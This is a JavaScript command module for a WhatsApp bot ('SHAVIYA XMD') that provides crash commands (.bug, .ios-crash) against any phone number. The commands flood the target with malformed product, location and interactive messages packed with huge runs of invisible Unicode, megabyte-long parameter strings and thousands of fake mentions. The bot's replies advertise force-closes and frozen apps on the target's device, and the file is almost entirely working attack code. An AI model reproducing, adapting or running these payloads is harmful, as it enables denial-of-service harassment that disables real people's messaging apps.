const { cmd } = require('../command');
const crypto = require('crypto');
const axios = require('axios');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

async function getImageBuffer(url) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
        return Buffer.from(response.data);
    } catch (error) {
        return null;
    }
}

function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX [cycles]\nExample: .${cmdName} 94712345678 5`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== .bug – PRODUCT + LIVE LOCATION (HEAVY UNICODE, FAST DELIVERY) ====================
// Original working product message
async function sendProduct(conn, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + " \u2060".repeat(90000),
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                productMessage: {
                    product: {
                        productImage: imageMessage,
                        productId: "449756950375071",
                        title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ",
                        description: "FUCK you Biych",
                        priceAmount1000: { low: 999, high: 0, unsigned: false },
                        url: "wa.me/status",
                        productImageCount: 9999999,
                        firstImageId: "9999999999",
                        salePriceAmount1000: { low: 9999999, high: 999999999, unsigned: true }
                    },
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// Live location with heavy Unicode (invisible characters + long text)
async function sendLiveLocation(conn, target) {
    const heavyUnicode = "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u2060".repeat(90000) + "\u2063".repeat(90000) + "ꦾ".repeat(90000);
    const msg = generateWAMessageFromContent(target, {
        liveLocationMessage: {
            degreesLatitude: 6.9271,
            degreesLongitude: 79.8612,
            caption: heavyUnicode,
            sequenceNumber: 0,
            contextInfo: { mentionedJid: [target] }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// .bug command – product + location combo, repeatable (cycles)
cmd({
    pattern: "bug",
    desc: "💀 ULTIMATE CRASH – 50 product + 50 live location per cycle (heavy unicode, double tick)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    let cycles = parseInt(args[1]);
    if (isNaN(cycles) || cycles < 1) cycles = 1;
    if (cycles > 100) cycles = 100; // safety limit (100 cycles = 10,000 messages)
    await reply(`💀 *SHAVIYA XMD ULTIMATE CRASH* → ${target}\n_Sending ${cycles} cycle(s) (${cycles*100} messages: product + live location)..._`);
    try {
        for (let c = 0; c < cycles; c++) {
            for (let i = 0; i < 50; i++) {
                await sendProduct(conn, target);
                await new Promise(r => setTimeout(r, 40));
            }
            for (let i = 0; i < 50; i++) {
                await sendLiveLocation(conn, target);
                await new Promise(r => setTimeout(r, 40));
            }
        }
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        const caption = `✅ ULTIMATE CRASH DELIVERED → ${target}\n⚠️ *Target WhatsApp flooded (${cycles*100} messages). Force close / black screen expected.*`;
        if (successImg) await conn.sendMessage(from, { image: successImg, caption });
        else await reply(caption);
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

// ==================== iOS CRASH – ALL 7 ORIGINAL FUNCTIONS (FIXED) ====================
// 1. NexusLightUiDelay
async function nexusLightUiDelay(conn, target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "\u2060".repeat(100000),
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769", height: 354, width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419", jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=", scanLengths: [2437, 17332],
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [{
                        embeddedContent: {
                            embeddedMusic: {
                                musicContentMediaId: "t.me/FinzzModzz",
                                songId: "⟅ ༑ ▾𝐍͜𝐄͡𝐗͢𝐔͜𝐒 🩸 𝐗͜-𝐓͡𝐑͢𝐀͜𝐒͡𝐇⟅ ༑ ▾",
                                author: "GATAU AH MALES" + "⏤͟͟͞͞𝐅𝐢𝐧𝐳𝐳𝐓𝐡𝐞͢𝐌𝐨𝐝𝐳𝐳⃭⃬⃑ᝄ".repeat(9999),
                                title: "t.me/FinzzModzz",
                                artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                artistAttribution: "https://www.instagram.com/_u/AlipzzyCrazzy",
                                countryBlocklist: true, isExplicit: true,
                                artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                            }
                        },
                        embeddedAction: null
                    }],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true, participant: target, remoteJid: target,
                        forwardingScore: 9741, isForwarded: false
                    }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, generateMessage, {});
    await conn.relayMessage(target, msg.message, {});
}

// 2. IosInvisibleForce
async function iosInvisibleForce(conn, target) {
    const msg = {
        locationMessage: {
            degreesLatitude: 21.1266, degreesLongitude: -11.8199,
            name: "\u2060".repeat(100000),
            url: "https://t.me/rizxvelzdev",
            contextInfo: {
                externalAdReply: {
                    quotedAd: {
                        advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                        mediaType: "IMAGE",
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                        caption: "\u2063".repeat(50000)
                    },
                    placeholderKey: { remoteJid: "0s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" }
                }
            }
        }
    };
    await conn.relayMessage(target, msg, {});
}

// 3. DelayNative
async function delayNative(conn, target) {
    const message = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "\u2060".repeat(1000), format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_message",
                        paramsJson: "\x10".repeat(1000000), version: 2
                    }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, message, {});
    await conn.relayMessage(target, msg.message, {});
}

// 4. VerloadFcVisibleV1 (3 parts)
async function verloadFcVisibleV1(conn, target) {
    const venomModsData = JSON.stringify({
        status: true, criador: "VenomMods", resultado: {
            type: "md", ws: { _events: { "CB:ib,,dirty": ["Array"] }, _eventsCount: 800000, _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat", config: { mobile: true } }
        }
    });
    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: "\u2060".repeat(1000), hasMediaAttachment: false },
                    body: { text: "\u2063".repeat(5000) },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0000" },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u2060".repeat(1000) }
                        ]
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg1.message, { participant: { jid: target } });
    const msg2 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "\u2060".repeat(10000), hasMediaAttachment: false,
                        locationMessage: {
                            degreesLatitude: -999.03499999999999, degreesLongitude: 922.999999999999,
                            name: "\u2063".repeat(10000), address: "\u2060".repeat(10000)
                        }
                    },
                    body: { text: "\u2060".repeat(5000) },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000),
                        buttons: Array(6).fill().map(() => ({ name: Math.random() > 0.5 ? "mpm" : "single_select", buttonParamsJson: "" }))
                    }
                }
            }
        }
    };
    await conn.relayMessage(target, msg2, { participant: { jid: target } });
    const msg3 = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "\u2060".repeat(5000), hasMediaAttachment: false,
                        locationMessage: {
                            degreesLatitude: -999.03499999999999, degreesLongitude: 922.999999999999,
                            name: "\u2063".repeat(10000), address: "\u2060".repeat(10000)
                        }
                    },
                    body: { text: "\u2060".repeat(2000) },
                    nativeFlowMessage: { messageParamsJson: "{".repeat(10000) },
                    contextInfo: { participant: target, mentionedJid: ["0@s.whatsapp.net"] }
                }
            }
        }
    };
    await conn.relayMessage(target, msg3, { participant: { jid: target } });
}

// 5. galaxy_invisible
async function galaxyInvisible(conn, target) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "\u2060".repeat(1000), format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message", paramsJson: "\u0000".repeat(1000000), version: 3
                    },
                    contextInfo: {
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`)
                        ],
                        externalAdReply: {
                            quotedAd: {
                                advertiserName: "\u2063".repeat(50000), mediaType: "IMAGE",
                                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                caption: "\u2060".repeat(50000)
                            },
                            placeholderKey: { remoteJid: "0s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" }
                        }
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// 6. CrashLoadIos
async function crashLoadIos(conn, target) {
    const locationMsg = {
        locationMessage: {
            degreesLatitude: 21.1266, degreesLongitude: -11.8199,
            name: "\u2060".repeat(100000),
            url: "https://t.me/rizxvelzdev",
            contextInfo: {
                externalAdReply: {
                    quotedAd: {
                        advertiserName: "\u2063".repeat(50000), mediaType: "IMAGE",
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                        caption: "\u2060".repeat(50000)
                    },
                    placeholderKey: { remoteJid: "0s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" }
                }
            }
        }
    };
    await conn.relayMessage(target, locationMsg, { participant: { jid: target } });
}

// 7. DelayMention
async function delayMention(conn, target) {
    const message = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "\u2060".repeat(500), format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_message", paramsJson: "\x10".repeat(1000000), version: 2
                    }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, message, {});
    await conn.relayMessage(target, msg.message, {});
}

// iOS combo – all 7 functions, repeatable
async function iosComboCrash(conn, target, repeat = 1) {
    const modules = [
        nexusLightUiDelay, iosInvisibleForce, delayNative, verloadFcVisibleV1,
        galaxyInvisible, crashLoadIos, delayMention
    ];
    for (let r = 0; r < repeat; r++) {
        for (const mod of modules) {
            try {
                await mod(conn, target);
                await new Promise(resolve => setTimeout(resolve, 100));
            } catch (err) {
                console.error(`iOS module failed:`, err.message);
            }
        }
    }
}

cmd({
    pattern: "ios-crash",
    desc: "🍏 iOS COMBO – all 7 original payloads, repeatable & invisible",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "ios-crash");
    if (!target) return;
    let repeat = parseInt(args[1]);
    if (isNaN(repeat) || repeat < 1) repeat = 1;
    if (repeat > 20) repeat = 20;
    await reply(`🍏 *SHAVIYA XMD iOS COMBO* → ${target}\n_Firing all 7 iOS modules, ${repeat} cycle(s) (total ${repeat*7} payloads)..._`);
    try {
        await iosComboCrash(conn, target, repeat);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        const caption = `✅ iOS COMBO DELIVERED → ${target}\n⚠️ *Target iOS WhatsApp will force close / freeze completely.*\n📊 *${repeat*7} invisible payloads sent.*`;
        if (successImg) await conn.sendMessage(from, { image: successImg, caption });
        else await reply(caption);
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

// ==================== MENU ====================
cmd({
    pattern: "bugmenu",
    desc: "Show crash menu",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply }) => {
    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug [number] [cycles] – 💀 ULTIMATE COMBO (50 product + 50 live location / cycle)*\n*│ 📌 .ios-crash [number] [repeat] – 🍏 iOS COMBO (all 7 payloads, repeatable)*\n*╰──────────────●●►*\n> 💡 *Examples:*\n> .bug 94712345678 3   → 300 messages\n> .ios-crash 94712345678 2 → 14 invisible payloads\n> ⚠️ *Extreme power – use only on numbers you own.*`;
    const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
    if (menuImg) {
        await conn.sendMessage(from, { image: menuImg, caption: menuText });
    } else {
        await reply(menuText);
    }
});
